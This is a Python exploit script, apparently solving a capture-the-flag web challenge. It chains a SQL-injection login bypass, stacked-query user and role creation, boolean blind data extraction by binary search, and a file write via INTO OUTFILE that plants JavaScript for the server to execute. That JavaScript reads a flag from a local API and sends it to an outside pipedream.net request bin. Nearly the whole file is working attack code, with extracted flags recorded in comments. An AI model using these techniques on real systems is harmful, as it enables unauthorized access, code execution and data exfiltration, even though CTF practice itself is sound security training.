import json
import re
import time
import datetime
import aiohttp
import asyncio
from string import printable
import uuid
import websockets


MIN_SEARCH = min([ord(x) for x in printable])
MAX_SEARCH = max([ord(x) for x in printable])

BASE_URL = "http://chal.firebird.sh:35020"
AUTH_URL = BASE_URL + "/auth"
API_URL = BASE_URL + "/api"

API_ENDPOINTS = {
    "users": "/users",
    "hash": "/hash",
    "ok": "/ok",
    "execute": "/execute",
    "test": "/login/test"
}

AUTH_ENDPOINTS = {
    "csrf": "/csrf",
    "login": "/callback/credentials?",
    "signin_csrf": "/signin?csrf=true"
}

sessions = []


async def get_csrf_token(session: aiohttp.ClientSession):
    try:
        async with session.get(AUTH_URL + AUTH_ENDPOINTS["csrf"]) as r:
            r_json = await r.json()
            return r_json["csrfToken"]
    except Exception as e:
        print(f"Error getting csrf token: {e}")
        print("WILL RETRY!")
        return await get_csrf_token(session)


async def get_auth_token(session: aiohttp.ClientSession, csrf_token, username, password):
    headers = {
        "X-Auth-Return-Redirect": "1"
    }

    data = {
        "csrfToken": csrf_token,
        "username": username,
        "password": password,
        "redirect": "false",
        "callbackUrl": BASE_URL
    }

    # submit as form data
    try:
        async with session.post(AUTH_URL + AUTH_ENDPOINTS["login"], data=data, headers=headers) as r:

            # print(r.cookies.get_dict())
            # print(r.json())
            # print(r)

            # get cookies
            auth_token_cookie = r.cookies.get("next-auth.session-token")
            token = str(auth_token_cookie).split("next-auth.session-token=")[1].split(";")[0]
            return token
    except Exception as e:
        print(f"Error getting auth token: {e}")
        print("WILL RETRY!")
        return await get_auth_token(session, csrf_token, username, password)


async def get_guest_login_token(session: aiohttp.ClientSession, csrf_token):
    return await get_auth_token(session, csrf_token, "' OR 1 LIMIT 2#", "")


async def get_password_hash(session: aiohttp.ClientSession, password):
    data = json.dumps({
        "password": password
    })
    headers = {
        "Content-Type": "text/plain;charset=UTF-8"
    }

    try:
        async with session.post(API_URL + API_ENDPOINTS["hash"], data=data, headers=headers) as r:
            r_json = await r.json()
            return r_json["hash"]
    except Exception as e:
        print(f"Error getting password hash: {e}")
        print("WILL RETRY!")
        return await get_password_hash(session, password)


async def users_endpoint_request(session: aiohttp.ClientSession, query):
    data = json.dumps({
        "query": query
    })
    headers = {
        "Content-Type": "text/plain;charset=UTF-8"
    }

    try:
        async with session.post(API_URL + API_ENDPOINTS["users"], data=data, headers=headers) as r:
            r_json = await r.json()
            return r_json
    except Exception as e:
        print(f"Error executing query: {e}")
        print("WILL RETRY!")
        return await users_endpoint_request(session, query)


async def execute_query(session: aiohttp.ClientSession, query):
    res = await users_endpoint_request(session, f"'' OR 0 uNION sELECT ({query}), 0, 0;#")
    if "tables" in res:
        return res["tables"][0][0]["id"]
    elif "error" in res:
        print(f"Error executing query: {res['error']}")
        return None
    print(f"Error executing query: {res}")
    return None


async def execute_query_no_output(session: aiohttp.ClientSession, query):
    res = await users_endpoint_request(session, f"''; {query}#")
    if "error" in res:
        print(f"Error executing query: {res['error']}")
        return None
    print(f"Executed query: {res}")
    return res


async def create_user(session: aiohttp.ClientSession, id, username, password):
    res = await users_endpoint_request(session, f"''; INSERT INTO users(id, username) VALUES ('{id}', '{username}')#")
    if "error" in res:
        if "Duplicate entry" in res["error"]:
            print("User already exists")

            # Update id 2603 to be hero
            res = await users_endpoint_request(session, f"''; UPDATE users SET username = 'hero' wHERE id = '2603'#")
            if "error" in res:
                print(f"Error updating user: {res['error']}")
        else:
            print(f"Error creating user: {res['error']}")
            return
    else:
        print(f"Created user {username} with id {id}")

    # set user password
    password_hash = await get_password_hash(session, password)
    print(f"Password hash: {password_hash}")
    # try to insert password into users_password table
    res = await users_endpoint_request(session, f"''; INSERT INTO user_password(id, password) VALUES ('{id}', '{password_hash}')#")
    if "error" in res:
        if "Duplicate entry" in res["error"]:
            print("Password already set")
            # update password
            res = await users_endpoint_request(session, f"''; UPDATE user_password SET password = '{password_hash}' wHERE id = '{id}'#")
            if "error" in res:
                print(f"Error updating password: {res['error']}")
        print(f"Error setting password: {res['error']}")
    else:
        print(f"Set password for user {username} to {password}")

    # set user type in user_data table to FIREBIRD_COMMUNITY_MEMBER
    community_member_string = f"concat('FIREBIRD', CHAR({ord('_')}), 'COMMUNITY_MEMBER')"
    # core_member_string = f"concat('FIREBIRD', CHAR({ord('_')}), 'CORE_MEMBER')"
    type_str = community_member_string
    res = await users_endpoint_request(session, f"''; INSERT INTO user_data(id, type) VALUES ('{id}', {type_str})#")
    if "error" in res:
        if "Duplicate entry" in res["error"]:
            print("Type already set")
            # update role
            res = await users_endpoint_request(session, f"''; UPDATE user_data SET type = {type_str} wHERE id = '{id}'#")
            if "error" in res:
                print(f"Error updating type: {res['error']}")
        print(f"Error setting type: {res['error']}")
    else:
        print(f"Set type for user {username} to {type_str}")


def process_schema_output(output):
    # Output example:
    # firebird.users.id - int, firebird.users.username - varchar(191), firebird.users.lastOk - datetime(3)
    schemas = {}

    columns = output.split(", ")
    for column in columns:
        schema = column.split(".")[0]
        table = column.split(".")[1]
        column_name = column.split(".")[2].split(" - ")[0]
        column_type = column.split(".")[2].split(" - ")[1]
        if schema not in schemas:
            schemas[schema] = {}
        if table not in schemas[schema]:
            schemas[schema][table] = {}
        schemas[schema][table][column_name] = column_type

    return schemas


async def get_database_info(session: aiohttp.ClientSession):
    # print(f"Secure file priv: {execute_query('sELECT @@secure_file_priv FROM dual')}")
    # print(f"Max allowed packet: {execute_query('sELECT @@max_allowed_packet FROM dual')}")
    # print(f"Local infile: {execute_query('sELECT @@local_infile FROM dual')}")
    # print(f"Current user: {await execute_query(session, 'sELECT CURRENT_USER()')}")
    # print(f"File priv: {execute_query('''sELECT if(file_priv = 'Y', sleep(1), null) FROM mysql.user wHERE user = 'exercise@%' ''')}")

    # Secure file priv: /var/lib/mysql-files/
    # Max allowed packet: 67108864
    # Local infile: 0
    # Current user: exercise@%

    res = await users_endpoint_request(session, "'' or 0 uNion sELECT GROUP_CONCAT(CONCAT(table_schema, '.', table_name, '.', column_name, ' - ', column_type) SEPARATOR ', '), 0, 0 FROM information_schema.columns wHERE table_schema != 'information_schema'#")
    print(res)

    output = res["tables"][0][0]["id"]
    schemas = process_schema_output(output)

    print(json.dumps(schemas, indent=4))


    # get info from information_schema
    # res = await users_endpoint_request(session, "'' or 0 uNION sELECT table_name, column_name, column_type FROM information_schema.columns wHERE table_schema != 'information_schema'#")
    # print(res)
    #
    # tables = {}
    # for column in res["tables"][0]:
    #     table_name = column["id"]
    #     column_name = column["username"]
    #     column_type = column["lastOk"]
    #     if table_name not in tables:
    #         tables[table_name] = {}
    #     tables[table_name][column_name] = column_type
    #
    # print(json.dumps(tables, indent=4))

    # {
    #     "user_data": {
    #         "id": "int",
    #         "type": "enum('FIREBIRD_CORE_MEMBER','FIREBIRD_COMMUNITY_MEMBER')"
    #     },
    #     "user_password": {
    #         "id": "int",
    #         "password": "varchar(191)"
    #     },
    #     "users": {
    #         "id": "int",
    #         "username": "varchar(191)",
    #         "lastOk": "datetime(3)"
    #     }
    # }
    return schemas


async def ok_bool(session: aiohttp.ClientSession, username, query) -> bool:
    last_last_ok = await get_last_ok(session, username)
    res = await ok(session, query)
    if "error" in res:
        print(f"Error executing query: {res['error']}")
        return False
    last_ok = await get_last_ok(session, username)
    return last_ok != last_last_ok


async def ok(session: aiohttp.ClientSession, ok):
    data = json.dumps({
        "ok": ok
    })
    headers = {
        "Content-Type": "text/plain;charset=UTF-8"
    }
    async with session.post(API_URL + API_ENDPOINTS["ok"], data=data, headers=headers) as r:
        r_json = await r.json()
        return r_json


async def execute(session: aiohttp.ClientSession, filename):
    data = json.dumps({
        "fileName": filename
    })
    headers = {
        "Content-Type": "text/plain;charset=UTF-8"
    }
    async with session.post(API_URL + API_ENDPOINTS["execute"], data=data, headers=headers) as r:
        json_res = await r.json()
        if "error" in json_res:
            print(f"Error executing file: {json_res['error']}")
            return False
        else:
            if "success" in json_res and json_res["success"]:
                print(f"Successfully sent execute request for {filename}")
                return True
        print(f"Unknown error executing file: {json_res}")
        return False


async def get_last_ok(session: aiohttp.ClientSession, username):
    data = {}
    try:
        data = await users_endpoint_request(session, username)
    except aiohttp.ServerDisconnectedError as e:
        print("Ah fuck, server disconn...??? - " + str(e))
        for i in range(len(sessions)):
            if sessions[i]["session"] == session:
                sessions[i] = await login(session, username.split("_")[1])
                session = sessions[i]
                return await get_last_ok(session, username)
    if "tables" in data:
        if "lastOk" in data["tables"][0][0]:
            last_ok_string = data["tables"][0][0]["lastOk"]
            if last_ok_string is None:
                # Make one OK and try again
                await ok(session, "SELECT 'ok'")
                return await get_last_ok(session, username)
            return datetime.datetime.strptime(last_ok_string, "%Y-%m-%dT%H:%M:%S.%fZ")
    print(f"Error getting lastOk for user {username}: {data}")
    return None


async def ok_bin_search_index(session_obj, subquery, start, end, index, from_query=""):
    session = session_obj["session"]
    username = session_obj["username"]
    semaphore = session_obj["semaphore"]

    async with semaphore:
        # Binary search
        last_last_ok = await get_last_ok(session, username)

        # Before we start, let's check if the payload is even between start and end
        # If not, we can just return None
        payload = f"SELECT IF(ord(SUBSTRING({subquery}, {index}, {index})) between {start} And {end}, 'yes', exp(1000)) {from_query}"
        print(f"[{index}]: Sending pre-check OK: {payload}")
        ok_res = await ok(session, payload)
        if "error" in ok_res:
            print(f"[{index}]: Error sending OK: {ok_res['error']}")
            return None
        last_ok = await get_last_ok(session, username)
        if last_ok == last_last_ok:
            print(f"[{index}]: Payload not between {start} and {end}, returning None! - {payload}")
            return None

        # Now that it has been asserted, let's do the actual binary search!
        left = start
        right = end
        while left <= right:
            mid = (left + right) // 2

            # Send OK
            # start = datetime.datetime.utcnow()
            payload = f"SELECT IF(ord(SUBSTRING({subquery}, {index}, {index})) between {left} And {mid}, 'yes', exp(1000)) {from_query}"

            print(f"[{index}]: Sending OK: {payload}")
            ok_res = await ok(session, payload)
            # end = datetime.datetime.utcnow()
            if "error" in ok_res:
                print(f"[{index}]: Error sending OK: {ok_res['error']}")
                return None

            # print(f"[{index}]: OK response: {ok_res}")

            last_ok = await get_last_ok(session, username)

            # Timings
            # print(f"Start time:\t\t\t{start} ({start.timestamp()} - {start.timestamp() % 2.633})")
            # print(f"Last ok time:\t\t{last_ok} ({last_ok.timestamp()} - {last_ok.timestamp() % 2.633})")
            # print(f"End time:\t\t\t{end} ({end.timestamp()} - {end.timestamp() % 2.633})")
            #
            # print(f"Time since OK:\t\t{(end - last_ok).total_seconds()} seconds")
            # print(f"Time since last OK:\t{(last_ok - last_last_ok).total_seconds()} seconds")

            success = last_ok != last_last_ok
            print(f"[{index}]: Query success: {success}")

            # Update last last ok
            last_last_ok = last_ok

            if success:
                right = mid - 1
            else:
                left = mid + 1
        if left < MIN_SEARCH or left > MAX_SEARCH:
            print(f"[{index}]: Left search space, done? ({left})")
            return None
        return left


async def ok_bin_search(subquery, start, end, length, from_query=""):
    # for i in length with async gather

    tasks = []
    for i in range(length):
        user_session = sessions[i % len(sessions)]
        tasks.append(ok_bin_search_index(user_session, subquery, start, end, i+1, from_query))

    results = await asyncio.gather(*tasks)
    return results


async def write_file(file_contents):
    session_obj = sessions[0]
    session = session_obj["session"]
    username = session_obj["username"]

    filename = str(uuid.uuid4()) + ".js"
    payload = f"SELECT '{file_contents}' INTO OUTFILE '/var/lib/mysql-files/{filename}'"
    print(f"Writing file using payload: {payload}")
    success = await ok_bool(session, username, payload)
    if success:
        print("last_ok changed, query success.")
        # Check if file exists
        print("Checking if file exists...")
        res = await ok_bin_search(f"length(load_file('/var/lib/mysql-files/{filename}'))", MIN_SEARCH, MAX_SEARCH, 4)
        output = ''.join([chr(i) for i in res if i is not None])
        if not output:
            print("Error writing file (length failed)")
            return None
        try:
            file_length = int(output)
            print(f"File contents length: {file_length}!")
        except ValueError:
            print("Error writing file (length failed)")
            return None

        return filename
    else:
        print("Error writing file (ok failed)")
        return None


async def read_file(filename):
    digit_length = 5
    res = await ok_bin_search("length(load_file('/var/lib/mysql-files/" + filename + "'))", MIN_SEARCH, MAX_SEARCH, digit_length)
    output = ''.join([chr(i) for i in res if i is not None])
    if not output:
        print("Error reading file length, does file exist?")
        return None
    print(f"File contents length: {output}")
    file_length = int(output)

    # Read file
    res = await ok_bin_search("load_file('/var/lib/mysql-files/" + filename + "')", MIN_SEARCH, MAX_SEARCH, file_length)
    output = ''.join([chr(i) for i in res if i is not None])
    print(f"File contents: {output}")
    return output


async def hw_ii():
    print("Writing new file...")
    # 3000 sveltekit
    # 5173 sveltekit docker?

    session_obj = sessions[0]
    session = session_obj["session"]
    username = session_obj["username"]
    csrf_token = session_obj["csrf"]
    auth_token = session_obj["token"]

    outfile = str(uuid.uuid4())

    # payload = "sELECT GROUP_CONCAT(CONCAT(table_schema, '.', table_name, '.', column_name, ' - ', column_type) SEPARATOR ', '), 0, 0 FROM information_schema.columns gROUP bY table_schema hAVING table_schema <> 'information_schema'"
    payload = "sELECT flag fROM firebird.ikuyo"
    payload = payload.replace("{outfile}", outfile)
    payload_length = len(payload)

    javascript = """
const payload = JSON.stringify({
    "ok": "{payload}"
});

const options = {
    hostname: "localhost",
    port: 5173,
    path: "/api/ok",
    method: "POST",
    headers: {
        "Content-Type": "text/plain;charset=UTF-8",
        "Content-Length": payload.length
    }
};

const req = http.request(options, (res) => {
    let data = "";
    res.on("data", (chunk) => {
        data += chunk;
    });
    res.on("end", () => {
        data_send = JSON.stringify({"message": data});

        const bin_options = {
            hostname: "enpoq84s17usr.x.pipedream.net",
            port: 443,
            path: "/",
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Content-Length": data_send.length
            },
        };

        const req_2 = https.request(bin_options, () => {});
        req_2.write(data_send);
        req_2.end();
    });
});
req.write(payload);
req.end();
    """

    # Add tokens
    javascript = javascript.replace("{payload}", payload).replace("{payload_length}", str(payload_length))\
        .replace("{csrf-token}", csrf_token).replace("{next-auth.session-token}", auth_token).replace("{outfile}", outfile)
    # format the javascript to be sent as a string to mysql (basically remove all useless stuff in the script)
    javascript = javascript.replace("\n", "").replace("\r", "").replace("\t", "").replace("'", "''")#.replace('"', '\\"')
    # remove multiple spaces
    javascript = re.sub(' +', ' ', javascript).strip()
    print(f"JavaScript: {javascript}")
    filename = await write_file(javascript)
    if not filename:
        print("Error writing file!")
        return
    print(f"Got file {filename}...")

    # Get last last ok
    # last_last_ok = await get_last_ok(session, username)

    # print(csrf_token)
    # print(auth_token)
    # input("Press enter to continue...")

    # execute file
    print("Executing file...")
    success = await execute(sessions[0]["session"], filename)
    if not success:
        return


    print("OK?")
    return

    # Wait 3 seconds
    # print("Waiting 6 seconds until we continue...")
    # await asyncio.sleep(6)

    # Get last ok to check if the request in the file worked
    # last_ok = await get_last_ok(session, username)
    # if last_last_ok != last_ok:
    #     print("File executed successfully (last_ok set)!")
    # else:
    #     print("Error executing file (no last_ok set)!")
    #     # return

    print("Reading outfile...")
    contents = await read_file(outfile)
    print(f"Got contents: {contents}")



    # Check for secure_file_priv

    # Get length of output

    # digit_length = 4
    # res = await ok_bin_search("length(@@secure_file_priv)", MIN_SEARCH, MAX_SEARCH, digit_length, from_query="FROM dual")
    # output = ''.join([chr(i) for i in res if i is not None])
    # print(f"@@secure_file_priv length: {output}")
    # @@secure_file_priv length: 21

    # res = await ok_bin_search("length(@@max_allowed_packet)", MIN_SEARCH, MAX_SEARCH, digit_length, from_query="FROM dual")
    # output = ''.join([chr(i) for i in res if i is not None])
    # print(f"@@max_allowed_packet length: {output}")
    # @@max_allowed_packet length: 8

    # Get secure_file_priv
    # secure_file_priv_len = 21
    # res = await ok_bin_search("@@secure_file_priv", MIN_SEARCH, MAX_SEARCH, secure_file_priv_len, from_query="FROM dual")
    # output = ''.join([chr(i) for i in res if i is not None])
    # print(f"@@secure_file_priv: {output}")

    # Get max_allowed_packet
    # max_allowed_packet_len = 8
    # res = await ok_bin_search("@@max_allowed_packet", MIN_SEARCH, MAX_SEARCH, max_allowed_packet_len, from_query="FROM dual")
    # output = ''.join([chr(i) for i in res if i is not None])
    # print(f"@@max_allowed_packet: {output}")

    # @@secure_file_priv: /var/lib/mysql-files/
    # @@max_allowed_packet: 67108864


    ## Check file_priv
    # payload = "SELECT if(file_priv = 'Y', 'yes', exp(1000)) FROM mysql.user HAVING user LIKE 'home%'"
    # payload = """SELECT 'hello there' INTO OUTFILE '/var/lib/mysql-files/hero.js'"""
    # payload = "SHOW PROCEDURE STATUS"
    # payload = "SHOW FUNCTION STATUS"
    # payload = "SELECT 'hello' INTO OUTFILE '/var/lib/mysql-files/hero.js'"
    # payload = "SELECT 'hello' iNTO oUTFILE '/var/lib/mysql-files/hero1.js'"
    # success = await ok_bool(session, username, payload)
    # print(f"Success: {success}")



    # res = await ok(session, payload)
    # print(res)
    pass



async def hw_i():
    # payload = """SELECT 'alert("help")' INTO OUTFILE '/var/lib/mysql-files/hero.js'"""
    # payload = f"SELECT if('hello' = 'hello', sleep({time_to_sleep}), null)"
    # flag = "flag{1f_y0u_cant_be4t_them_jo1n_th3m}"

    # username_length = 4
    # res = await ok_bin_search("'flag'", MIN_SEARCH, MAX_SEARCH, username_length)
    # print(res)
    # print(''.join([chr(i) for i in res if i is not None]))

    # Get username length
    # digits = 4
    # res = await ok_bin_search("length(current_user())", MIN_SEARCH, MAX_SEARCH, digits)
    # print(res)
    # print(''.join([chr(i) for i in res if i is not None]))
    # Prints out: 11

    # Get username
    # username_length = 11
    # res = await ok_bin_search("current_user()", MIN_SEARCH, MAX_SEARCH, username_length)
    # print(res)
    # print(''.join([chr(i) for i in res if i is not None]))
    # home				1@%

    # Get schema infos
    # GROUP_CONCAT(CONCAT(table_schema, '.', table_name, '.', column_name, ' - ', column_type) SEPARATOR ', ')
    # Get length of info schema output
    # digits = 5
    # res = await ok_bin_search("length(GROUP_CONCAT(CONCAT(table_schema, '.', table_name, '.', column_name, ' - ', column_type) SEPARATOR ', '))", MIN_SEARCH, MAX_SEARCH, digits, "FROM information_schema.columns GROUP BY table_schema HAVING table_schema <> 'information_schema'")
    # print(res)
    # print(''.join([chr(i) for i in res if i is not None]))
    # 37

    # Get info schema output
    # str_length = 37
    # res = await ok_bin_search(
    #     "GROUP_CONCAT(CONCAT(table_schema, '.', table_name, '.', column_name, ' - ', column_type) SEPARATOR ', ')",
    #     MIN_SEARCH, MAX_SEARCH, str_length,
    #     "FROM information_schema.columns GROUP BY table_schema HAVING table_schema <> 'information_schema'")
    # print(res)
    # output = ''.join([chr(i) for i in res if i is not None])
    # print(output)
    # json_out = process_schema_output(output)
    # print(json.dumps(json_out, indent=4))
    # {
    #     "firebird": {
    #         "homework": {
    #             "flag": "varchar(191)"
    #         }
    #     }
    # }

    # Get flag length
    # digits = 4
    # res = await ok_bin_search("length(flag)", MIN_SEARCH, MAX_SEARCH, digits, "FROM firebird.homework")
    # print(res)
    # print(''.join([chr(i) for i in res if i is not None]))

    # Get flag
    # flag_length = 27
    # res = await ok_bin_search("flag", MIN_SEARCH, MAX_SEARCH, flag_length, "FROM firebird.homework")
    # print(res)
    # print(''.join([chr(i) for i in res if i is not None]))
    # flag{ar3_y0u_ok4y_h3ll0_3q}
    pass


async def login(session: aiohttp.ClientSession, i):
    # Create the users
    user_id = f"2603{i}"
    username = f"hero_{i}"
    password = "passwordThatIsVeryLong!HAHAH>:3muchsecret-HiIan!"
    # Only needed the first time
    # await create_user(guest_session, user_id, username, password)

    # Create new session for the user
    session = aiohttp.ClientSession()
    # Login as new user
    print(f"Logging in as {username}")
    csrf = await get_csrf_token(session)
    # print(f"CSRF for {username}: {csrf}")
    token = await get_auth_token(session, csrf, username, password)
    # print(f"Auth token for {username}: {token}")

    return {
        "session": session,
        "csrf": csrf,
        "token": token,
        "username": username,
        "user_id": user_id,
        "semaphore": asyncio.Semaphore(1)
    }


async def bin_search_query_fun(session: aiohttp.ClientSession):
    # Binary search for current user using output of yes and no
    left = MIN_SEARCH
    right = MAX_SEARCH
    i = 1
    output = ""
    while True:
        while left <= right:
            mid = (left + right) // 2
            res = await execute_query(session, f"sElect if(ord(substring(current_user(), {i}, {i})) between {left} And {mid}, 'yes', 'no')")
            print(f"{i}: {left} - {mid} - {right} = {res}")
            if res == "yes":
                right = mid - 1
            elif res == "no":
                left = mid + 1
            else:
                print(f"Error: {res}")
                return
        if left < MIN_SEARCH or left > MAX_SEARCH:
            print(f"Left search space, done? ({left})")
            return output
        output += chr(left)
        print(f"Current output: {output}")
        i += 1
        left = MIN_SEARCH
        right = MAX_SEARCH


async def initialize_sessions(user_amount: int):
    global sessions
    # Open guest session
    print("Opening guest session...")
    async with aiohttp.ClientSession() as guest_session:
        guest_csrf = await get_csrf_token(guest_session)
        # print(f"Guest CSRF: {guest_csrf}")
        guest_token = await get_guest_login_token(guest_session, guest_csrf)
        # print(f"Guest auth token: {guest_token}")

        # Create users and store their sessions
        tasks = [login(guest_session, i) for i in range(user_amount)]
        sessions = await asyncio.gather(*tasks)
    print("Logged all sessions in!")
    return sessions


# async def open_websocket(key):
#     async with websockets.connect(f"ws://chal.firebird.sh:35020/",
#                                   origin="http://chal.firebird.sh:35020",
#         subprotocols=["vite-hmr"], extra_headers={"Sec-WebSocket-Protocol": "vite-hmr", "Sec-WebSocket-Key": key}
#                                   ) as websocket:
#         print("Sending")
#         websocket.send("Hello")
#         print("Waiting for recv")
#         while True:
#             msg = websocket.recv()
#             print(f"Received: {msg}")


async def main():
    # Create users and store their sessions
    await initialize_sessions(11)

    default_session = sessions[0]["session"]

    # await hw_i()
    await hw_ii()

    # execute("flag.sql")


    # query_res = execute_query_no_output("sELECT 'flag{hi_there}' INTO OUTFILE '/var/lib/mysql-files/hiThere'")
    # query_res = execute_query("sELECT load_file('/var/lib/mysql-files/hero.js')")
    # print(f"Query result: {query_res}")

    # await get_database_info(default_session)

    # Close all sessions
    print("CLOSING SESSIONS!")
    for session in sessions:
        await session["session"].close()


if __name__ == "__main__":
    asyncio.run(main())
